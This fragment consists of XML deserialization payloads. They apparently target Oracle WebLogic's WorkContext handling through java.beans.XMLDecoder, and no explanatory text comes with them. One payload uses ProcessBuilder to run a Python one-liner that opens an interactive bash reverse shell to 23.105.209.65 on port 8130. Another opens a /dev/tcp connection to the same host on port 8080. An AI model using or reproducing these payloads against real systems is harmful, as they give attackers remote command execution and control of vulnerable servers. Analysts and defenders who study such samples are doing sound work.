        ...
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              ...
              <void index="2">
                <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("23.105.209.65",8130));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</string>
              </void>
            </array>
		...
		<java version="1.8.0_131" class="java.beans.XMLDecoder">
		  	<void class = "java.io.FileOutputStream">
		  		<object class = "java.io.File">
		  			<string>/dev/tcp/23.105.209.65/8080</string>
		  		</object>
		  	</void>
		</java>
	  </work:WorkContext>
